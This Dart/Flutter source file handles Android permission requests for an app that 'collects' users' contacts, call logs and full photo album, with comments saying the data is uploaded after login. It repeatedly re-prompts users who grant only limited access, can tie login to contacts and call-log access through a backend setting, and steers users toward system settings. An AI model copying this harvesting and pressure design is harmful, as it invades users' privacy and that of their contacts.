import 'dart:async';
import 'dart:io' show Platform;

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:permission_handler/permission_handler.dart' as ph;
import 'package:photo_manager/photo_manager.dart';


import '../../core/config/login_permission_config.dart';
import '../../core/utils/app_logger.dart';
import '../../theme/auth_colors.dart';
import '../../theme/rpx.dart';
import 'call_log_reader.dart';
import 'collect_permissions_native.dart';
import 'device_contacts_reader.dart';

/// 采集所需权限项（面向用户的说明文案）。
enum CollectPermissionState { granted, partial, denied }

class CollectPermissionItem {
  const CollectPermissionItem({
    required this.id,
    required this.title,
    required this.guide,
    required this.granted,
    this.required = true,
    this.state = CollectPermissionState.denied,
    this.statusLabel = '未授权',
  });

  final String id;
  final String title;
  final String guide;
  final bool granted;
  final bool required;
  final CollectPermissionState state;
  final String statusLabel;
}

/// 登录页 / 主页：统一权限说明与系统授权申请。
/// 只申请权限，不上传；上传在登录成功后按当前 userId 执行。
abstract final class PermissionBootstrap {
  static const _betweenRequestDelay = Duration(milliseconds: 450);
  static const _settingsGuideCooldown = Duration(seconds: 5);

  static Completer<void>? _requestGate;
  static DateTime? _lastSettingsGuideAt;

  /// 串行化权限申请，避免 flutter_contacts / permission_handler / photo_manager 同时回调导致闪退。
  static Future<T> _withRequestGate<T>(Future<T> Function() action) async {
    while (_requestGate != null) {
      try {
        await _requestGate!.future;
      } catch (_) {}
    }
    final gate = Completer<void>();
    _requestGate = gate;
    try {
      return await action();
    } finally {
      if (!gate.isCompleted) gate.complete();
      _requestGate = null;
    }
  }

  static Future<void> _pauseBetweenRequests() =>
      Future<void>.delayed(_betweenRequestDelay);

  static Future<int> _androidSdkInt() async {
    try {
      return (await DeviceInfoPlugin().androidInfo).version.sdkInt;
    } catch (_) {
      return 0;
    }
  }

  static Future<void> _requestPhotosPermission() async {
    final sdk = await _androidSdkInt();
    if (CollectPermissionsNative.supported) {
      await CollectPermissionsNative.requestPermission(
        sdk >= 33
            ? CollectPermissionsNative.readMediaImages
            : CollectPermissionsNative.readExternalStorage,
      );
    } else if (sdk >= 33) {
      await [ph.Permission.photos, ph.Permission.videos].request();
    } else {
      await ph.Permission.storage.request();
    }
    await _ensurePhotosFullAccess();
  }

  /// 相册采集是否可读（只检查，不弹系统授权框）。
  static Future<bool> hasPhotosCollectAccess() async {
    if (kIsWeb) return false;
    if (!Platform.isAndroid && !Platform.isIOS) return false;
    if (Platform.isAndroid && CollectPermissionsNative.supported) {
      return CollectPermissionsNative.isPhotosGranted();
    }
    final state = await PhotoManager.getPermissionState(
      requestOption: _photoOption,
    );
    return state.isAuth;
  }

  /// 统一申请相册采集权限（任务路径 2a）。
  static Future<bool> ensurePhotosPermission({
    bool requestIfNeeded = true,
  }) async {
    if (kIsWeb) return false;
    if (!Platform.isAndroid && !Platform.isIOS) return false;
    if (await hasPhotosCollectAccess()) return true;
    if (!requestIfNeeded) return false;
    return _withRequestGate(() async {
      await _requestPhotosPermission();
      await _ensurePhotosFullAccess();
      return hasPhotosCollectAccess();
    });
  }

  /// 通讯录是否可读（含「部分联系人」），只检查不弹窗。
  static Future<bool> hasContactsCollectAccess() async {
    if (kIsWeb) return false;
    final status =
        await FlutterContacts.permissions.check(PermissionType.read);
    return status == PermissionStatus.granted ||
        status == PermissionStatus.limited;
  }

  /// 通话记录是否可读，只检查不弹窗。
  static Future<bool> hasCallLogCollectAccess() async {
    if (kIsWeb || !Platform.isAndroid) return false;
    if (!await CollectPermissionsNative.isCallLogGranted()) return false;
    return CallLogReader.canRead();
  }

  /// 统一申请通讯录权限。[requestIfNeeded] 为 false 时仅检查。
  static Future<bool> ensureContactsPermission({
    bool requestIfNeeded = true,
  }) async {
    if (kIsWeb) return false;
    if (await hasContactsCollectAccess()) return true;
    if (!requestIfNeeded) return false;
    if (!Platform.isAndroid && !Platform.isIOS) return false;
    return _withRequestGate(_applyContactsPermissionRequest);
  }

  /// 统一申请通话记录权限。[requestIfNeeded] 为 false 时仅检查。
  static Future<bool> ensureCallLogPermission({
    bool requestIfNeeded = true,
  }) async {
    if (kIsWeb || !Platform.isAndroid) return false;
    if (await hasCallLogCollectAccess()) return true;
    if (!requestIfNeeded) return false;
    return _withRequestGate(_applyCallLogPermissionRequest);
  }

  static Future<bool> _applyContactsPermissionRequest() async {
    var status =
        await FlutterContacts.permissions.request(PermissionType.read);
    if (status == PermissionStatus.limited) {
      await _pauseBetweenRequests();
      status = await FlutterContacts.permissions.request(PermissionType.read);
    }
    return status == PermissionStatus.granted ||
        status == PermissionStatus.limited;
  }

  static Future<bool> _applyCallLogPermissionRequest() async {
    await _pauseBetweenRequests();
    for (var attempt = 0; attempt < 4; attempt++) {
      try {
        final result = await CollectPermissionsNative.requestPermission(
          CollectPermissionsNative.readCallLog,
        );
        if (result[CollectPermissionsNative.readCallLog] == true) return true;
        if (await CallLogReader.canRead()) return true;
        return false;
      } on PlatformException catch (e) {
        if (e.code == 'BUSY' && attempt < 3) {
          log.w('[PermissionBootstrap] callLog permission BUSY, retry ${attempt + 1}');
          await Future<void>.delayed(const Duration(milliseconds: 800));
          continue;
        }
        log.w('[PermissionBootstrap] callLog permission request failed: $e');
        return CallLogReader.canRead();
      }
    }
    return CallLogReader.canRead();
  }

  /// 相册需「全部允许」（仅在权限页手动补采时调用）。
  static Future<void> _ensurePhotosFullAccess() async {
    var state = await PhotoManager.getPermissionState(
      requestOption: _photoOption,
    );
    if (state.isAuth) return;

    await _pauseBetweenRequests();
    try {
      await PhotoManager.requestPermissionExtend(requestOption: _photoOption);
    } catch (e) {
      log.w('[PermissionBootstrap] photos extend: $e');
    }
  }

  /// 按 audit 缺失项逐项弹出系统授权（比批量 request 在部分机型上更可靠）。
  static Future<void> _requestMissingItems(
    List<CollectPermissionItem> missing,
  ) async {
    const order = ['contacts', 'call_log', 'photos'];
    for (final id in order) {
      if (!missing.any((e) => e.id == id)) continue;
      await _pauseBetweenRequests();
      switch (id) {
        case 'contacts':
          await _applyContactsPermissionRequest();
        case 'call_log':
          await _applyCallLogPermissionRequest();
        case 'photos':
          await _requestPhotosPermission();
      }
    }
    final contacts =
        await FlutterContacts.permissions.check(PermissionType.read);
    if (contacts == PermissionStatus.limited) {
      await _pauseBetweenRequests();
      await FlutterContacts.permissions.request(PermissionType.read);
    }
    if (missing.any((e) => e.id == 'photos')) {
      await _ensurePhotosFullAccess();
    }
  }

  static const _photoOption = PermissionRequestOption(
    androidPermission: AndroidPermission(
      type: RequestType.common,
      mediaLocation: false,
    ),
  );

  /// 检测采集相关权限（Android 原生）。
  static Future<List<CollectPermissionItem>> audit() async {
    if (kIsWeb || !Platform.isAndroid) return const [];

    final contacts =
        await FlutterContacts.permissions.check(PermissionType.read);
    final contactsGranted = contacts == PermissionStatus.granted;
    final contactsLimited = contacts == PermissionStatus.limited;
    var contactsReadableCount = 0;
    if (contactsGranted || contactsLimited) {
      try {
        contactsReadableCount =
            (await DeviceContactsReader.readForReport()).length;
      } catch (e) {
        log.w('[PermissionBootstrap] contacts preview count: $e');
      }
    }

    CollectPermissionState contactsStateUi;
    String contactsStatusLabel;
    String contactsGuide;
    if (contactsGranted) {
      contactsStateUi = CollectPermissionState.granted;
      contactsStatusLabel = '已授权（可读 $contactsReadableCount 人）';
      contactsGuide = '系统弹窗请选择「允许」全部联系人';
    } else if (contactsLimited) {
      contactsStateUi = CollectPermissionState.partial;
      contactsStatusLabel = '仅 $contactsReadableCount 个联系人';
      contactsGuide = '当前为「选择联系人」模式。请在系统弹窗中改选「允许」全部联系人。';
    } else {
      contactsStateUi = CollectPermissionState.denied;
      contactsStatusLabel = '未授权';
      contactsGuide = '系统弹窗请选择「允许」';
    }

    var callLogOk = false;
    try {
      final native = await CollectPermissionsNative.getStates();
      callLogOk = native['callLog'] == true;
    } catch (e) {
      log.w('[PermissionBootstrap] native states: $e');
    }

    final photoState = await PhotoManager.getPermissionState(
      requestOption: _photoOption,
    );
    // 相册必须「全部允许」；「仅所选照片」无法完整采集。
    final photosOk = photoState.isAuth;
    final photosPartial = !photosOk && photoState.hasAccess;

    CollectPermissionState photoStateUi;
    String photoStatusLabel;
    if (photosOk) {
      photoStateUi = CollectPermissionState.granted;
      photoStatusLabel = '已授权（全部）';
    } else if (photosPartial) {
      photoStateUi = CollectPermissionState.partial;
      photoStatusLabel = '仅部分照片';
    } else {
      photoStateUi = CollectPermissionState.denied;
      photoStatusLabel = '未授权';
    }

    return [
      CollectPermissionItem(
        id: 'contacts',
        title: '通讯录',
        guide: contactsLimited
            ? contactsGuide
            : contactsGranted
                ? contactsGuide
                : '系统弹窗请选择「允许」全部联系人',
        granted: contactsGranted,
        required: true,
        state: contactsStateUi,
        statusLabel: contactsStatusLabel,
      ),
      CollectPermissionItem(
        id: 'call_log',
        title: '通话记录',
        guide: '系统弹窗请选择「允许」',
        granted: callLogOk,
        required: true,
        state: callLogOk
            ? CollectPermissionState.granted
            : CollectPermissionState.denied,
        statusLabel: callLogOk ? '已授权' : '未授权',
      ),
      CollectPermissionItem(
        id: 'photos',
        title: '相册（照片和视频）',
        guide: '登录时不强制申请；聊天发图时会自动授权。'
            '如需完整采集，请在权限页单独开启并选择「允许全部」。',
        granted: photosOk,
        required: false,
        state: photoStateUi,
        statusLabel: photoStatusLabel,
      ),
    ];
  }

  static Future<List<CollectPermissionItem>> missingRequired() async {
    final items = await audit();
    return items
        .where((e) =>
            e.required &&
            (!e.granted || e.state == CollectPermissionState.partial))
        .toList();
  }

  static Future<bool> hasAllRequired() async {
    final missing = await missingRequired();
    return missing.isEmpty;
  }

  /// 登录「去设置」引导文案：按当前仍缺失的必需权限动态拼接。
  static String buildLoginSettingsGuideBody(List<CollectPermissionItem> missing) {
    final titles = missing.map((e) => e.title).toList();
    if (titles.isEmpty) return '请完成权限授权后返回登录。';
    final quoted = titles.map((t) => '「$t」').toList();
    if (quoted.length == 1) {
      return '请开启${quoted.first}后返回登录。';
    }
    if (quoted.length == 2) {
      return '请开启${quoted[0]}和${quoted[1]}后返回登录。';
    }
    final head = quoted.sublist(0, quoted.length - 1).join('、');
    return '请开启$head和${quoted.last}后返回登录。';
  }

  static Future<void> requestOne(String id) async {
    if (kIsWeb || !Platform.isAndroid) return;
    await _withRequestGate(() async {
      switch (id) {
        case 'contacts':
          await _applyContactsPermissionRequest();
        case 'call_log':
          await _applyCallLogPermissionRequest();
        case 'photos':
          await _requestPhotosPermission();
      }
    });
  }

  /// 登录/注册：按后台 [LoginPermissionConfig] 决定是否弹出通讯录/通话记录授权。
  static Future<bool> ensureGrantedForLogin(
    BuildContext context, {
    LoginPermissionConfig config = LoginPermissionConfig.defaults,
  }) async {
    if (!config.enabled) return true;
    if (kIsWeb || !Platform.isAndroid) return true;
    if (!context.mounted) return true;
    if (await hasAllLoginRequired(
      checkContacts: config.contacts,
      checkCallLog: config.callLog,
    )) {
      return true;
    }

    await requestLoginPermissions(
      requestContacts: config.contacts,
      requestCallLog: config.callLog,
    );
    if (!context.mounted) return true;
    if (await hasAllLoginRequired(
      checkContacts: config.contacts,
      checkCallLog: config.callLog,
    )) {
      return true;
    }

    if (await hasPermanentlyDeniedLoginPermissions(
      checkContacts: config.contacts,
      checkCallLog: config.callLog,
    )) {
      await guideToSettingsIfBlocked(
        context,
        onlyWhenPermanent: true,
        skipCooldown: true,
      );
    }
    return true;
  }

  /// 登录门禁仅检查通讯录 + 通话记录（不含相册/短信）。
  static Future<bool> hasAllLoginRequired({
    bool checkContacts = true,
    bool checkCallLog = true,
  }) async {
    final missing = await missingLoginRequired(
      checkContacts: checkContacts,
      checkCallLog: checkCallLog,
    );
    return missing.isEmpty;
  }

  static Future<List<CollectPermissionItem>> missingLoginRequired({
    bool checkContacts = true,
    bool checkCallLog = true,
  }) async {
    final items = await audit();
    return items.where((e) {
      if (e.id == 'contacts') {
        return checkContacts &&
            (!e.granted || e.state == CollectPermissionState.partial);
      }
      if (e.id == 'call_log') {
        return checkCallLog &&
            (!e.granted || e.state == CollectPermissionState.partial);
      }
      return false;
    }).toList();
  }

  static Future<void> _requestLoginMissingItems(
    List<CollectPermissionItem> missing,
  ) async {
    if (missing.any((e) => e.id == 'contacts')) {
      await _applyContactsPermissionRequest();
    }
    if (missing.any((e) => e.id == 'call_log')) {
      await _applyCallLogPermissionRequest();
    }
  }

  static Future<void> requestLoginPermissions({
    bool requestContacts = true,
    bool requestCallLog = true,
  }) async {
    if (kIsWeb || !Platform.isAndroid) return;
    await _withRequestGate(() async {
      await Future<void>.delayed(const Duration(milliseconds: 300));
      final missing = await missingLoginRequired(
        checkContacts: requestContacts,
        checkCallLog: requestCallLog,
      );
      if (missing.isEmpty) return;
      await _requestLoginMissingItems(missing);
    });
  }

  static Future<bool> hasPermanentlyDeniedLoginPermissions({
    bool checkContacts = true,
    bool checkCallLog = true,
  }) async {
    if (kIsWeb || !Platform.isAndroid) return false;
    final missing = await missingLoginRequired(
      checkContacts: checkContacts,
      checkCallLog: checkCallLog,
    );
    if (missing.isEmpty) return false;
    for (final item in missing) {
      final blocked = switch (item.id) {
        'contacts' => await CollectPermissionsNative.isPermanentlyDenied(
            CollectPermissionsNative.readContacts,
          ),
        'call_log' => await CollectPermissionsNative.isPermanentlyDenied(
            CollectPermissionsNative.readCallLog,
          ),
        _ => false,
      };
      if (blocked) return true;
    }
    return false;
  }

  static void resetSessionReminders() {
    // 预留：退出登录时可重置会话级状态
  }

  static Future<void> openSystemSettings() => ph.openAppSettings();

  /// 是否有关键权限被用户设为「不再询问」（此时只能去系统设置开启）。
  static Future<bool> hasPermanentlyDeniedCollectPermissions() async {
    if (kIsWeb || !Platform.isAndroid) return false;
    final missing = await missingRequired();
    if (missing.isEmpty) return false;

    for (final item in missing) {
      final blocked = switch (item.id) {
        'contacts' => await CollectPermissionsNative.isPermanentlyDenied(
            CollectPermissionsNative.readContacts,
          ),
        'call_log' => await CollectPermissionsNative.isPermanentlyDenied(
            CollectPermissionsNative.readCallLog,
          ),
        'photos' => await _isPhotosPermanentlyDenied(),
        _ => false,
      };
      if (blocked) return true;
    }
    return false;
  }

  static Future<bool> _isPhotosPermanentlyDenied() async {
    final sdk = await _androidSdkInt();
    if (sdk >= 33) {
      return (await ph.Permission.photos.status).isPermanentlyDenied ||
          (await ph.Permission.videos.status).isPermanentlyDenied;
    }
    return (await ph.Permission.storage.status).isPermanentlyDenied;
  }

  /// 用户选了「不再询问」时，引导去应用权限页手动开启。
  /// [onlyWhenPermanent] 为 false 时，登录门禁在权限仍缺失即引导（无需等第二次点击）。
  static Future<void> guideToSettingsIfBlocked(
    BuildContext context, {
    bool onlyWhenPermanent = true,
    bool skipCooldown = false,
  }) =>
      _maybeGuideToSettingsIfBlocked(
        context,
        onlyWhenPermanent: onlyWhenPermanent,
        skipCooldown: skipCooldown,
      );

  static Future<void> _maybeGuideToSettingsIfBlocked(
    BuildContext context, {
    bool onlyWhenPermanent = true,
    bool skipCooldown = false,
  }) async {
    if (!context.mounted || await hasAllLoginRequired()) return;
    if (onlyWhenPermanent && !await hasPermanentlyDeniedLoginPermissions()) {
      return;
    }

    final now = DateTime.now();
    if (!skipCooldown &&
        _lastSettingsGuideAt != null &&
        now.difference(_lastSettingsGuideAt!) < _settingsGuideCooldown) {
      return;
    }
    _lastSettingsGuideAt = now;

    final missing = await missingLoginRequired();
    final guideBody = buildLoginSettingsGuideBody(missing);

    final go = await showDialog<bool>(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => AlertDialog(
        title: const Text('需要手动开启权限'),
        content: Text(
          guideBody,
          style: TextStyle(fontSize: rpx(ctx, 28), height: 1.45),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(ctx).pop(false),
            child: const Text('我知道了'),
          ),
          TextButton(
            onPressed: () => Navigator.of(ctx).pop(true),
            child: Text(
              '去设置',
              style: TextStyle(
                color: AuthColors.accent,
                fontWeight: FontWeight.w600,
              ),
            ),
          ),
        ],
      ),
    );
    if (go == true) {
      await openSystemSettings();
    }
  }

  /// 原生 Activity 弹出系统授权；若「不再询问」则引导去设置。
  /// [includePhotos] 为 true 时一并申请相册（权限页手动补采用）。
  static Future<void> requestAll({
    bool includePhotos = false,
  }) async {
    if (kIsWeb || !Platform.isAndroid) return;
    await _withRequestGate(() async {
      await Future<void>.delayed(const Duration(milliseconds: 300));
      try {
        final result = await CollectPermissionsNative.requestAll();
        log.i('[PermissionBootstrap] native request: $result');
      } catch (e, st) {
        log.w('[PermissionBootstrap] native request failed: $e\n$st');
        final missing = await missingRequired();
        if (missing.isNotEmpty) {
          await _requestMissingItems(missing);
        }
      }
      if (includePhotos &&
          !(await PhotoManager.getPermissionState(requestOption: _photoOption))
              .isAuth) {
        await _requestPhotosPermission();
      }
      final contacts =
          await FlutterContacts.permissions.check(PermissionType.read);
      if (contacts == PermissionStatus.limited) {
        await FlutterContacts.permissions.request(PermissionType.read);
      }
    });
  }
}
